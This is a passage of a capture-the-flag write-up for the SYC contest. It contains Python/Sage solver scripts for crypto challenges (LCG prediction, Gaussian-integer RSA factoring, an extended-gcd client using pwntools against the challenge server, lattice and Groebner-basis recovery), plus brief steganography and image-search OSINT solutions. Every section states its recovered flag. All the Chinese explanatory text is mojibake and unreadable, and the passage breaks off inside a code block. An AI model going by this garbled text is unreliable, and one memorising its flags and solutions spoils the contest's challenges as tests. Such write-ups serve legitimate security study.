<span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">50</span>):</span><br><span class="line">    <span class="built_in">next</span> = []</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">3</span>):</span><br><span class="line">        out = (out*m+c)%n</span><br><span class="line">        card,suit = choose_card(out)</span><br><span class="line">        real_card = <span class="built_in">str</span>(card+<span class="number">1</span>).replace(<span class="string">&#x27;10&#x27;</span>,<span class="string">&#x27;0&#x27;</span>).replace(<span class="string">&#x27;11&#x27;</span>,<span class="string">&#x27;J&#x27;</span>).replace(<span class="string">&#x27;12&#x27;</span>,<span class="string">&#x27;Q&#x27;</span>).replace(<span class="string">&#x27;13&#x27;</span>,<span class="string">&#x27;K&#x27;</span>).replace(<span class="string">&#x27;1&#x27;</span>,<span class="string">&#x27;A&#x27;</span>)</span><br><span class="line">        <span class="built_in">next</span>.append(<span class="string">f&#x27;<span class="subst">&#123;suit&#125;</span>_<span class="subst">&#123;real_card&#125;</span>&#x27;</span>.encode())</span><br><span class="line">    </span><br><span class="line">    <span class="built_in">next</span> = <span class="string">b&#x27; &#x27;</span>.join(<span class="built_in">next</span>)</span><br><span class="line">    <span class="built_in">print</span>(k,<span class="built_in">next</span>)</span><br><span class="line">    </span><br><span class="line">    r.recvuntil(<span class="string">b&#x27;(example: Heart_1 Club_2 Diamond_3)\n&#x27;</span>)</span><br><span class="line">    r.sendline(<span class="built_in">next</span>)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(r.recvall().decode())</span><br><span class="line"></span><br><span class="line"><span class="comment"># Congratulations! You matched the cards!</span></span><br><span class="line"><span class="comment"># The flag is your reward!</span></span><br><span class="line"><span class="comment"># b&#x27;SYC&#123;lcg_a@@@@@ttack&#125;&#x27;</span></span><br></pre></td></tr></table></figure><p>â€‹    </p><h3 id="EzComplex"><a href="#EzComplex" class="headerlink" title="EzComplex"></a>EzComplex</h3><blockquote><p>And u, my friend: Complex factors! (In a double sense)</p></blockquote><p>é«˜æ–¯æ•´æ•°åˆ†è§£ã€‚</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">c = <span class="number">122977267154486898127643454001467185956864368276013342450998567212966113302012584153291519651365278888605594000436279106907163024162771486315220072170917153855370362692990814276908399943293854077912175867886513964032241638851526276</span></span><br><span class="line">N = <span class="number">973990451943921675425625260267293227445098713194663380695161260771362036776671793195525239267004528550439258233703798932349677698127549891815995206853756301593324349871567926792912475619794804691721625860861059975526781239293017498</span></span><br><span class="line">GI = GaussianIntegers()</span><br><span class="line">d = divisors(GI(N))</span><br><span class="line"><span class="keyword">for</span> k <span class="keyword">in</span> d:</span><br><span class="line">    <span class="keyword">if</span> <span class="string">&#x27;I&#x27;</span> <span class="keyword">in</span> <span class="built_in">str</span>(k):</span><br><span class="line">        p = <span class="built_in">int</span>(<span class="built_in">abs</span>(k.imag()))</span><br><span class="line">        q = <span class="built_in">int</span>(<span class="built_in">abs</span>(k.real()))</span><br><span class="line">        <span class="keyword">if</span> p.bit_length() <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">382</span>,<span class="number">385</span>) <span class="keyword">and</span> is_prime(p) <span class="keyword">and</span> q.bit_length() <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">382</span>,<span class="number">385</span>) <span class="keyword">and</span> is_prime(q):</span><br><span class="line">            <span class="built_in">print</span>((p,q))</span><br><span class="line">            </span><br><span class="line"><span class="comment"># (8732781022306464325787401448517171026218291389436971731700810979177651389459896422549428444142746055523338740248707, 29962125885196559918101088622575501736433575381042696980660846307183241725227137854663856022170515177120773072848343)</span></span><br><span class="line"><span class="comment"># (29962125885196559918101088622575501736433575381042696980660846307183241725227137854663856022170515177120773072848343, 8732781022306464325787401448517171026218291389436971731700810979177651389459896422549428444142746055523338740248707)</span></span><br></pre></td></tr></table></figure><p>å†å¸¸è§„RSAï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">p,q = (<span class="number">8732781022306464325787401448517171026218291389436971731700810979177651389459896422549428444142746055523338740248707</span>, <span class="number">29962125885196559918101088622575501736433575381042696980660846307183241725227137854663856022170515177120773072848343</span>)</span><br><span class="line">e = <span class="number">0x10001</span></span><br><span class="line">c = <span class="number">122977267154486898127643454001467185956864368276013342450998567212966113302012584153291519651365278888605594000436279106907163024162771486315220072170917153855370362692990814276908399943293854077912175867886513964032241638851526276</span></span><br><span class="line">f = (p-<span class="number">1</span>)*(q-<span class="number">1</span>)</span><br><span class="line">d = inverse_mod(e,f)</span><br><span class="line">m = <span class="built_in">pow</span>(c,d,p*q)</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">bytes</span>.fromhex(<span class="built_in">hex</span>(m)[<span class="number">2</span>:]))</span><br><span class="line"></span><br><span class="line"><span class="comment"># b&#x27;SYC&#123;D0_you_like_r41n?_i_pref3r_R1_ng&#125;&#x27;</span></span><br></pre></td></tr></table></figure><p>â€‹    </p><h3 id="ext-7gcd"><a href="#ext-7gcd" class="headerlink" title="ext^7gcd"></a>ext^7gcd</h3><blockquote><p>é¢˜ç›®é“¾æ¥ï¼šnc 59.110.20.54:1789 ï¼ˆä¸‹sagemath! ä¸ä¸‹çš„ç»Ÿç»Ÿå‘é…åˆ°å®‰ä¸œæ˜Ÿå½“å˜¿å¥´ï¼ï¼‰</p></blockquote><p>åˆ†æï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">a1*p1+a2*p2=1</span><br><span class="line">a3*p3+a4*p4=1</span><br><span class="line">a5*p5+a6*p6=1</span><br><span class="line">a0*p0+a*(a1*p1+a2*p2+a3*p3+a4*p4+a5*p5+a6*p6)=a0*p0+a*3=1</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> hashlib <span class="keyword">import</span> sha256</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"><span class="keyword">from</span> pwnlib.util.iters <span class="keyword">import</span> mbruteforce</span><br><span class="line"></span><br><span class="line">r = remote(<span class="string">&quot;59.110.20.54&quot;</span>,<span class="number">1789</span>)</span><br><span class="line"></span><br><span class="line">table = string.ascii_letters+string.digits</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">PoW</span>():</span><br><span class="line">    r.recvuntil(<span class="string">b&quot;XXXX+&quot;</span>)</span><br><span class="line">    suffix = r.recv(<span class="number">16</span>).decode(<span class="string">&quot;utf8&quot;</span>)</span><br><span class="line">    r.recvuntil(<span class="string">b&quot;== &quot;</span>)</span><br><span class="line">    cipher = r.recvline().strip().decode(<span class="string">&quot;utf8&quot;</span>)</span><br><span class="line">    proof = mbruteforce(<span class="keyword">lambda</span> x: sha256((x + suffix).encode()).hexdigest() ==</span><br><span class="line">                        cipher, table, length=<span class="number">4</span>, method=<span class="string">&#x27;fixed&#x27;</span>)</span><br><span class="line">    r.sendlineafter(<span class="string">b&#x27;XXXX: &#x27;</span>, proof.encode())</span><br><span class="line">    </span><br><span class="line">PoW()</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">xgcd</span>(<span class="params">a,b</span>):</span><br><span class="line">    prevx, x = <span class="number">1</span>, <span class="number">0</span>;  prevy, y = <span class="number">0</span>, <span class="number">1</span></span><br><span class="line">    <span class="keyword">while</span> b:</span><br><span class="line">        q, r = <span class="built_in">divmod</span>(a,b)</span><br><span class="line">        x, prevx = prevx - q*x, x  </span><br><span class="line">        y, prevy = prevy - q*y, y</span><br><span class="line">        a, b = b, r</span><br><span class="line">    <span class="keyword">return</span> a, prevx, prevy</span><br><span class="line">    </span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">15</span>):</span><br><span class="line">    r.recvuntil(<span class="string">b&#x27;[&#x27;</span>)</span><br><span class="line">    p = <span class="built_in">eval</span>(<span class="string">b&#x27;[&#x27;</span>+r.recvuntil(<span class="string">b&#x27;]&#x27;</span>))</span><br><span class="line">    _,a1,a2 = xgcd(p[<span class="number">1</span>],p[<span class="number">2</span>])</span><br><span class="line">    _,a3,a4 = xgcd(p[<span class="number">3</span>],p[<span class="number">4</span>])</span><br><span class="line">    _,a5,a6 = xgcd(p[<span class="number">5</span>],p[<span class="number">6</span>])</span><br><span class="line">    _,a0,a = xgcd(p[<span class="number">0</span>],<span class="number">3</span>)</span><br><span class="line">    r.recvuntil(<span class="string">b&#x27;a6: &#x27;</span>)</span><br><span class="line">    r.sendline(<span class="string">f&#x27;<span class="subst">&#123;a0&#125;</span>,<span class="subst">&#123;a*a1&#125;</span>,<span class="subst">&#123;a*a2&#125;</span>,<span class="subst">&#123;a*a3&#125;</span>,<span class="subst">&#123;a*a4&#125;</span>,<span class="subst">&#123;a*a5&#125;</span>,<span class="subst">&#123;a*a6&#125;</span>&#x27;</span>.encode())</span><br><span class="line">    <span class="built_in">print</span>(r.recvline())</span><br><span class="line"></span><br><span class="line">r.interactive()</span><br><span class="line"></span><br><span class="line"><span class="comment"># Congrats! Your flag is: SYC&#123;N0t_s0_e4sy_3xtgCd&#125;</span></span><br></pre></td></tr></table></figure><p>â€‹    </p><h3 id="Algebra"><a href="#Algebra" class="headerlink" title="Algebra"></a>Algebra</h3><blockquote><p>Recently jrl888 has learned something about groebner_basis.But could U plz help him to sovle his linear algebra homework?</p></blockquote><p>çŸ©é˜µ <code>1*32 * 32*16 = 1*16</code>ï¼Œæ„é€ æ ¼è§„çº¦ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">p = <span class="number">76231309481023608274751321361920497941621991893430257210800219032855778863403</span></span><br><span class="line">M = [...]</span><br><span class="line">c = [...]</span><br><span class="line"></span><br><span class="line">M = matrix(ZZ, <span class="number">32</span>,<span class="number">16</span>, M)</span><br><span class="line">I = identity_matrix(<span class="number">32</span>)</span><br><span class="line">P = p * identity_matrix(<span class="number">16</span>)</span><br><span class="line">C = matrix(ZZ, c)</span><br><span class="line">Z1 = zero_matrix(<span class="number">16</span>,<span class="number">32</span>)</span><br><span class="line">Z2 = zero_matrix(<span class="number">1</span>,<span class="number">32</span>)</span><br><span class="line">L = block_matrix(ZZ,[[M,I],[P,Z1],[C,Z2]])</span><br><span class="line">B = L.LLL()</span><br><span class="line">key = <span class="built_in">list</span>(-B[<span class="number">1</span>][<span class="number">16</span>:])</span><br><span class="line"><span class="built_in">print</span>(key)</span><br><span class="line"></span><br><span class="line"><span class="comment"># [241, 234, 29, 209, 141, 236, 196, 125, 153, 121, 243, 104, 157, 250, 164, 197, 241, 85, 184, 247, 145, 27, 128, 184, 203, 233, 104, 196, 118, 255, 12, 24]</span></span><br></pre></td></tr></table></figure><p>å†æ ¹æ®</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">x1^e0%p=c0</span><br><span class="line">x2^e1%p=c1</span><br><span class="line">x3^e2%p=c2</span><br><span class="line">x1+x2+x3=s</span><br><span class="line">GBåŸºè§£</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">key = [<span class="number">241</span>, <span class="number">234</span>, <span class="number">29</span>, <span class="number">209</span>, <span class="number">141</span>, <span class="number">236</span>, <span class="number">196</span>, <span class="number">125</span>, <span class="number">153</span>, <span class="number">121</span>, <span class="number">243</span>, <span class="number">104</span>, <span class="number">157</span>, <span class="number">250</span>, <span class="number">164</span>, <span class="number">197</span>, <span class="number">241</span>, <span class="number">85</span>, <span class="number">184</span>, <span class="number">247</span>, <span class="number">145</span>, <span class="number">27</span>, <span class="number">128</span>, <span class="number">184</span>, <span class="number">203</span>, <span class="number">233</span>, <span class="number">104</span>, <span class="number">196</span>, <span class="number">118</span>, <span class="number">255</span>, <span class="number">12</span>, <span class="number">24</span>]</span><br><span class="line">key = <span class="built_in">int</span>(<span class="built_in">bytes</span>(key).<span class="built_in">hex</span>(),<span class="number">16</span>)</span><br><span class="line"><span class="built_in">print</span>(key)</span><br><span class="line">c = [<span class="number">5415723658972576382153559473862560277755192970021711034483296770242757614573901416501357332661976379693731699836578087114136761491831672836130172409491889</span>, <span class="number">210713951733721296094981135225517096332793112439184310028590576805069783972692891743044656754643189870169698041576462365740899368554671164493356650858567594970345928936103914826926922045852943068526737627918609421198466329605091625</span>, <span class="number">93558120697660628972553751937347865465963385519812302371069578286123647411810258547153399045605149278436900736665388355004346922404097196048139360206875149390218160164739477798859206611473675859708579299466581718543909912951088772842957187413726251892347470983848602814387339449340072310561011153714207338630</span>]</span><br><span class="line">p = <span class="number">175336555462486363373099551411803174933803940918372428249159666803182759268063415863987676455854054651631174131625763475189413468427467197699058719725221879406119373683175842618465694427132003565774900609456204965408254598477034791500576573579131820364396996254469692964946065509325801687720344376041097328929</span></span><br><span class="line">s = <span class="number">192597139210277682598060185912821582569043452465684540030278464832244948354365</span></span><br><span class="line"></span><br><span class="line">P.&lt;i&gt; = PolynomialRing(ZZ)</span><br><span class="line">f = i^<span class="number">3</span> - <span class="number">10</span>*i^<span class="number">2</span> + <span class="number">31</span>*i - <span class="number">30</span></span><br><span class="line">res = f.roots()</span><br><span class="line">e = [k[<span class="number">0</span>] <span class="keyword">for</span> k <span class="keyword">in</span> res]</span><br><span class="line"></span><br><span class="line">P.&lt;x1,x2,x3&gt; = PolynomialRing(Zmod(p))</span><br><span class="line">f1 = x1^e[<span class="number">2</span>]-c[<span class="number">0</span>]</span><br><span class="line">f2 = x2^e[<span class="number">1</span>]-c[<span class="number">1</span>]</span><br><span class="line">f3 = x3^e[<span class="number">0</span>]-c[<span class="number">2</span>]</span><br><span class="line">f4 = x1+x2+x3-s</span><br><span class="line">G = Ideal([f1, f2, f3, f4]).groebner_basis()</span><br><span class="line"><span class="built_in">print</span>(G)</span><br><span class="line">m = <span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> b <span class="keyword">in</span> G:</span><br><span class="line">    <span class="keyword">assert</span> b.degree() == <span class="number">1</span></span><br><span class="line">    mi = ZZ(-b(<span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>))</span><br><span class="line">    <span class="built_in">print</span>(<span class="built_in">bytes</span>.fromhex(<span class="built_in">hex</span>(mi^^key)[<span class="number">2</span>:]))</span><br><span class="line">    </span><br><span class="line"><span class="comment"># b&#x27;SYC&#123;You_are_SYC&#123;You_are_SYC&#123;You_&#x27;</span></span><br><span class="line"><span class="comment"># b&#x27;really_algebreally_algebreally_a&#x27;</span></span><br><span class="line"><span class="comment"># b&#x27;ra_master&#125;\x02\x02ra_master&#125;\x02\x02ra_maste&#x27;</span></span><br></pre></td></tr></table></figure><p>flagï¼š<code>SYC&#123;You_are_really_algebra_master&#125;</code>ã€‚</p><p>â€‹    </p><h2 id="MISC"><a href="#MISC" class="headerlink" title="MISC"></a>MISC</h2><h3 id="cheekin"><a href="#cheekin" class="headerlink" title="cheekin"></a>cheekin</h3><blockquote><p>è¯·å‰å¾€â€ä¸‰å¶è‰å°ç»„Sycloverâ€å¾®ä¿¡å…¬ä¼—å·è¾“å…¥flagè·å¾—flag</p></blockquote><p>å‘é€flagï¼Œä¸‹è½½å›¾ç‰‡ï¼Œzstegçš„b1,rgb,lsb,xyé€šé“æœ‰ <code>syc&#123;s4y_he110_t0_syclover&#125;</code>ã€‚</p><p>â€‹    </p><h3 id="ez-smilemo"><a href="#ez-smilemo" class="headerlink" title="ez_smilemo"></a>ez_smilemo</h3><blockquote><p>æ¸¸æˆé€šå…³å³å¯å¾—åˆ°flagå†…å®¹ï¼Œéœ€è¦è‡ªè¡Œæ·»åŠ <code>SYC&#123;&#125;</code>åŒ…å«ã€‚ä¾‹: flagå†…å®¹ä¸º haha_haha åˆ™æœ€ç»ˆflagä¸º SYC{haha_haha} é¢˜ç›®é“¾æ¥ï¼š<a href="https://pan.baidu.com/s/1Vfklz0_isBoHNylRv8um8w?pwd=geek">https://pan.baidu.com/s/1Vfklz0_isBoHNylRv8um8w?pwd=geek</a> hint: data.win</p></blockquote><p>ä½¿ç”¨<a href="https://github.com/krzys-h/UndertaleModTool">UndertaleModTool</a>å·¥å…·è§£åŒ…data.winï¼Œåœ¨stringçª—å£æ‰¾åˆ°ï¼š<code>c20xbGVfMXNfQF9uMWNlX2dAbWU=</code>ï¼Œbase64è§£ç ï¼š<code>sm1le_1s_@_n1ce_g@me</code>ã€‚</p><p>flagï¼š<code>SYC&#123;sm1le_1s_@_n1ce_g@me&#125;</code></p><p>â€‹    </p><h3 id="DEATH-N0TE"><a href="#DEATH-N0TE" class="headerlink" title="DEATH_N0TE"></a>DEATH_N0TE</h3><blockquote><p>â€œo2takuXXçªç„¶å¤±è¸ªäº†ï¼Œä½ ä½œä¸ºä»–çš„å¥½æœ‹å‹ï¼Œå†³å®šå»ä»–çš„æˆ¿é—´çœ‹çœ‹æ˜¯å¦ç•™ä¸‹äº†ä»€ä¹ˆçº¿ç´¢â€¦â€ã€‚å‰ç½®å‰§æƒ…é¢˜ï¼Œflagæœ‰ä¸¤æ®µï¼Œéšå†™çš„ä¿¡æ¯æœ‰ç‚¹å¤šè®°å¾—ç»™ä¿¡æ¯æ‹¿å…¨ã€‚ hint1: Stegsolve lsb hint2: å›¾ç‰‡å¤§å°å’Œåƒç´ ç‚¹</p></blockquote><p>pngå›¾ç‰‡æœ«å°¾æå–å‡ºï¼š</p><p><code>IuS9oOaJvuWIsOS6huS4gOacrOOAikRFQVRIIE5PVEXjgIvvvIzlpb3lpYflv4PpqbHkvb/kvaDnv7vlvIDov5nmnKznrJTorrDvvIzkvaDpmIXor7vkuobkvb/nlKjop4TliJnvvIzkvYbmmK/kvaDmg4rorrblnLDlj5HnjrDliJrmiY3nmoTop4TliJnkuYvkuK3llK/ni6zmsqHmnInnrKwxMOadoS4uLiIKIuS9oOWGjeasoeWOu+ehruiupOaYr+WQpuWmguatpO+8jOeslOiusOS4iueahOaWh+Wtl+WNtOS7v+S9m+a0u+S6hui1t+adpe+8jOWcqOS9oOecvOS4reS4jeaWreWcsOaUvuWkp+e8qeWwj++8jOS9oOmXreS4iuS6huWPjOecvC4uLiIKIuWOn+acrOm7keiJsueahOaWh+Wtl+S4gOi9rOWPmOaIkOihgOe6ouiJsu+8jOivoeW8gueahOeUu+mdoui/mOaYr+WHuueOsOS6juS9oOeahOinhue9keiGnOWJje+8jOS9oOWGs+WumuS4jeWGjee6oOe7k+S6jumBl+WkseeahOinhOWIme+8jOW5u+iniea2iOWkseS6hi4uLiI=</code></p><p>base64è§£ç ï¼š</p><p><code>&quot;ä½ æ‰¾åˆ°äº†ä¸€æœ¬ã€ŠDEATH NOTEã€‹ï¼Œå¥½å¥‡å¿ƒé©±ä½¿ä½ ç¿»å¼€è¿™æœ¬ç¬”è®°ï¼Œä½ é˜…è¯»äº†ä½¿ç”¨è§„åˆ™ï¼Œä½†æ˜¯ä½ æƒŠè®¶åœ°å‘ç°åˆšæ‰çš„è§„åˆ™ä¹‹ä¸­å”¯ç‹¬æ²¡æœ‰ç¬¬10æ¡...&quot;&quot;ä½ å†æ¬¡å»ç¡®è®¤æ˜¯å¦å¦‚æ­¤ï¼Œç¬”è®°ä¸Šçš„æ–‡å­—å´ä»¿ä½›æ´»äº†èµ·æ¥ï¼Œåœ¨ä½ çœ¼ä¸­ä¸æ–­åœ°æ”¾å¤§ç¼©å°ï¼Œä½ é—­ä¸Šäº†åŒçœ¼...&quot;&quot;åŸæœ¬é»‘è‰²çš„æ–‡å­—ä¸€è½¬å˜æˆè¡€çº¢è‰²ï¼Œè¯¡å¼‚çš„ç”»é¢è¿˜æ˜¯å‡ºç°äºä½ çš„è§†ç½‘è†œå‰ï¼Œä½ å†³å®šä¸å†çº ç»“äºé—å¤±çš„è§„åˆ™ï¼Œå¹»è§‰æ¶ˆå¤±äº†...&quot;</code></p><p>æ²¡ä»€ä¹ˆç”¨ï¼Œzsteg åœ¨ b1,rgb,lsb,xy é€šé“æå–å‡ºï¼š</p><p><code>IuS9oOe7p+e7reinguWvn+aJi+S4iua8hum7keiJsueahOeslOiusOacrO+8jOWGt+mdmeS4i+adpeeahOS9oOWPkeeOsOS6huiXj+WcqOWwgemdouacgOS4i+i+ueeahOS4gOihjOWwj+WtlzpTWUN7RDRAVGhfTjB0NF8iCiLkvaDmtY/op4jov4fmlbTkuKrnrJTorrDmnKzvvIzlj6/mg5zlhajmmK/nqbrnmb3pobXvvIzlhbbkuK3mnInkuIDpobXkuI3nn6XpgZPooqvosIHmkpXmjonkuobvvIzkvaDmnIDnu4jov5jmmK/nv7vliLDkuobnvLrlpLHnmoTpgqPkuIDpobUiCiLkvaDnlKjpk4XnrJTmtoLmirnnnYDlkI7pnaLkuIDpobXvvIzkuIrpnaLnvJPnvJPlh7rnjrDkuobpgZflpLHnmoTnl5Xov7kuLi4i</code></p><p>base64è§£ç ï¼š</p><p><code>&quot;ä½ ç»§ç»­è§‚å¯Ÿæ‰‹ä¸Šæ¼†é»‘è‰²çš„ç¬”è®°æœ¬ï¼Œå†·é™ä¸‹æ¥çš„ä½ å‘ç°äº†è—åœ¨å°é¢æœ€ä¸‹è¾¹çš„ä¸€è¡Œå°å­—:SYC&#123;D4@Th_N0t4_&quot;&quot;ä½ æµè§ˆè¿‡æ•´ä¸ªç¬”è®°æœ¬ï¼Œå¯æƒœå…¨æ˜¯ç©ºç™½é¡µï¼Œå…¶ä¸­æœ‰ä¸€é¡µä¸çŸ¥é“è¢«è°æ’•æ‰äº†ï¼Œä½ æœ€ç»ˆè¿˜æ˜¯ç¿»åˆ°äº†ç¼ºå¤±çš„é‚£ä¸€é¡µ&quot;&quot;ä½ ç”¨é“…ç¬”æ¶‚æŠ¹ç€åé¢ä¸€é¡µï¼Œä¸Šé¢ç¼“ç¼“å‡ºç°äº†é—å¤±çš„ç—•è¿¹...&quot;</code></p><p>å¾—åˆ°flagå‰åŠæ®µï¼š<code>SYC&#123;D4@Th_N0t4_</code>ã€‚</p><p>æ”¾å¤§å›¾ç‰‡ï¼Œå¯å‘ç°ç™½è‰²åƒç´ ç‚¹ï¼Œç»“åˆé¢˜ç›®æŸ¥æ‰¾ä¸º<a href="https://www.fonts.net.cn/font-17419261686.html">æ­»äº¡ç¬”è®°å­—ä½“</a>ï¼Œå­—ç¬¦ä¸²ï¼š<code>TkFNRV9vMnRha3VYWH0</code></p><p>base64è§£ç å¾—åˆ°flagååŠæ®µï¼š<code>NAME_o2takuXX&#125;</code>ã€‚</p><p>flagï¼š<code>SYC&#123;D4@Th_N0t4_NAME_o2takuXX&#125;</code></p><p>â€‹    </p><h3 id="ä¸‹ä¸€ç«™æ˜¯å“ªå„¿å‘¢"><a href="#ä¸‹ä¸€ç«™æ˜¯å“ªå„¿å‘¢" class="headerlink" title="ä¸‹ä¸€ç«™æ˜¯å“ªå„¿å‘¢"></a>ä¸‹ä¸€ç«™æ˜¯å“ªå„¿å‘¢</h3><blockquote><p>æˆ‘å’Œyxxå»æ—…æ¸¸ï¼Œå‰ä¸€å¤©è¿˜å¥½å¥½çš„ï¼Œç©å®Œã€ŠæŒ‡æŒ¥å®˜åŸºæ©ã€‹è¿™ä¸ªæ¸¸æˆå°±ç¡è§‰äº†ï¼Œç¬¬äºŒå¤©æ™šä¸Šåƒå®Œé¥­å¥¹äººå°±ä¸è§äº†ï¼Œèµ°ä¹‹å‰ç•™ä¸‹äº†ä¸¤å¼ å›¾ç‰‡å°±æ¶ˆå¤±äº†ã€‚ä½ èƒ½å¸®æˆ‘æ‰¾æ‰¾å¥¹åå“ªä¸ªèˆªç­å»å“ªä¸ªåœ°æ–¹äº†å˜›ï¼Ÿ  flagæ ¼å¼ï¼šSYC{èˆªç­å·_åŸå¸‚æ‹¼éŸ³}ï¼ŒåŸå¸‚æ‹¼éŸ³é¦–å­—æ¯å¤§å†™å™¢</p></blockquote><p>æŸ¥è¯¢ <code>æœ‰ç™½è‰²é’¢ç´çš„æœºåœº</code>ï¼Œé…åˆç™¾åº¦ä»¥å›¾æœå›¾åŠŸèƒ½ï¼ŒæŸ¥æ‰¾åˆ°åœ°ç‚¹ä¸ºï¼š<code>æ·±åœ³å®å®‰å›½é™…æœºåœº</code>ã€‚</p><p>ä»1.jpgæå–å‡ºzipå‹ç¼©åŒ…ï¼Œå¾—åˆ°secret.pngï¼Œä¸ºStandard Galactic Alphabetå­—ä½“ï¼Œåˆ©ç”¨<a href="https://www.dcode.fr/standard-galactic-alphabet">åœ¨çº¿ç½‘ç«™</a>è§£å‡ºä¿¡æ¯ä¸ºï¼š<code>I WANT TO GO TO LIQUOR CITY</code>ã€‚</p><p>LIQUOR CITY=é…’åŸ=æ³¸å·å¸‚ï¼ŒåŸå¸‚æ‹¼éŸ³ï¼š<code>Luzhou</code>ã€‚</p><p>æ ¹æ®å›¾ç‰‡ä¿¡æ¯ï¼šæ—¶é—´8.25 20:19 é©¬ä¸Šèµ·é£ï¼Œåœ¨<a href="https://www.flightstats.com/v2/flight-tracker/route/SZX/LZO/?year=2023&amp;month=10&amp;date=24&amp;hour=18">flightstats</a>ä¸ŠæŸ¥è¯¢æ·±åœ³-æ³¸å·çš„èˆªç­å·ä¸ºï¼š<code>CZ8579</code>ã€‚</p><p>flagï¼š<code>SYC&#123;CZ8579_Luzhou&#125;</code></p><p>â€‹    </p><h3 id="Qingwanå¿ƒéƒ½è¦ç¢äº†"><a href="#Qingwanå¿ƒéƒ½è¦ç¢äº†" class="headerlink" title="Qingwanå¿ƒéƒ½è¦ç¢äº†"></a>Qingwanå¿ƒéƒ½è¦ç¢äº†</h3><blockquote><p>Qingwanå’ŒYxxä¸€èµ·å»æ—…æ¸¸ï¼Œä½†æ˜¯Qingwanç¡çš„å¤ªæ­»å•¦ï¼ŒYxxä¸¢ä¸‹å¥¹ä¸€ä¸ªäººå»ç©äº†ï¼Œå¥¹ä¸€è§‰èµ·æ¥åªçœ‹è§Yxxå‘çš„æœ‹å‹åœˆï¼Œèƒ½å¸®Qingwanæ‰¾åˆ°å¥¹å—ï¼Ÿ flagæ ¼å¼ï¼šSYC{åœ°ç‚¹åå­—}</p></blockquote><p>ç™¾åº¦ï¼Œä»¥å›¾æœå›¾ã€‚</p><p><code>SYC&#123;é‡åº†ä¸­å›½ä¸‰å³¡åšç‰©é¦†&#125;</code></p><p>â€‹    </p><h3 id="xqr"><a href="#xqr" class="headerlink" title="xqr"></a>xqr</h3><blockquote><p>Qrcode can deliver binary msg</p></blockquote><p>pngåˆ†ç¦»å¾—åˆ°ä¸¤å¼ pngå›¾ç‰‡ï¼ŒæŒ‰åƒç´ å€¼å¼‚æˆ–æ“ä½œå³å¾—åˆ°æ–°äºŒç»´ç ã€‚</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span 